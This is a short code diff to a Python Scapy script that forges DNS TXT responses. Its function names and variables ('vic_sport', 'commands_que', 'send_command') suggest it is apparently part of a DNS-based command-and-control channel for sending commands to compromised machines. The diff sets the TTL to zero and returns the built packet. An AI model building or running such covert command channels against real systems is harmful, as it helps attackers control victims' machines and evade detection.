@@ -51,12 +51,13 @@ def build_p(packet,data):
         an=DNSRR(
             rrname=packet[DNS].qd.qname,
             type='TXT',
-            ttl=600,
+            ttl=0,
             rdata=data)
         )
 
     # Put the full packet together
     response_packet = eth / ip / udp / dns
+    return response_packet
 
 def send_command(ip_adr,vic_sport,get_qname,packet):
     global commands_que
